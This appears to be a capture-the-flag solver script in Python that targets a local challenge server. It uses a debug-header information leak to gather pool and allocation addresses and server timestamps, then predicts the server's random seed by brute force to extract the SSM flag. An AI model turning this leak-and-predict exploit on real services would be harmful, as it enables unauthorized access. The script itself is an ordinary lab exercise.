import requests
import time
from collections import deque
from pwn import *
import random

def get_time():
    current_time = time.time()
    seconds = int(current_time)
    microseconds = int((current_time - seconds) * 1000000)
    return (seconds * 1000000) + microseconds
    
url = "http://127.0.0.1:50000/chall"

session = requests.Session()
session.get(url) # first one is super slow

pool_arr = []
alloc_arr = []
stack_arr = []
time_diffs = []

tot_req = 0

for a in range(100): # assume big, will be less
    tot_req += 1
    headers = {"DEBUG": "asdf"}
    client_time = get_time()
    response = session.get(url, headers=headers)
    pool = unpack(response.text.split("request: ")[1].split(" </p>")[0], 'all')

    srv_time = int(response.text.split("time: ")[1].split(" ")[0])
    time_diffs.append(srv_time - client_time)
    
    if pool not in pool_arr:
        pool_arr.append(pool)
    else:
        print(a)
        break

de = deque(pool_arr)
de.rotate(-1)

for a in de:
    alloc_arr.append(a + 0x4a0)

for a in range(100):
    tot_req += 1
    headers = {"DEBUG": "asdf"}
    client_time = get_time()
    response = session.get(url, headers=headers)
    pool_bruh = unpack(response.text.split("request: ")[1].split(" </p>")[0], 'all')
    tmp_i = pool_arr.index(pool_bruh)
    pool = pool_arr[tmp_i]
    alloc = alloc_arr[tmp_i]
    

    seed = int(response.text.split("seed: ")[1].split(" ")[0], 16)
    srv_time = int(response.text.split("time: ")[1].split(" ")[0])
    stack = ((seed+1)^(srv_time>>32)^(srv_time)^(pool)^(alloc)) & 0xfffffff0

    time_diffs.append(srv_time - client_time)



    if stack not in stack_arr:
        stack_arr.append(stack)
    else:
        # print(f"repeat: {a}")
        break

print("GUSSING TIME")
for a in range(1000): # run again bruh if this not enough
    pool_guess = pool_arr[(tot_req)%len(pool_arr)]
    alloc_guess = alloc_arr[(tot_req)%len(alloc_arr)]
    stack_guess = stack_arr[(len(stack_arr)+a+1)%len(stack_arr)]

    client_time = get_time()
    time_guess = random.randint(min(time_diffs), max(time_diffs)) + client_time

    seed_guess = (((time_guess >> 32)^(time_guess)^(pool_guess)^(alloc_guess)^(stack_guess))-1) & 0xffffffff

    headers = {"DEBUG": "asdf", f"{hex(seed_guess)}": "1234"}
    response = session.get(url, headers=headers)
    seed = int(response.text.split("seed: ")[1].split(" ")[0], 16)

    print(hex(seed))
    print(hex(seed_guess))

    if seed_guess == seed:
        print("CORRECT!")
        print("SSM{" + response.text.split("SSM{")[1].split("}")[0] + "}")
        break

    tot_req += 1


session.close()
exit()

# following loops 5 times then repeats:
# pool_1 + 0x4f0 = alloc_2

# Send 5 requests and print their response bodies
for i in range(100):
    response = session.get(url, headers=headers)
    print(f"Response {i+1}:")
    print(response.text.split("\n")[0])
    print("-" * 50)
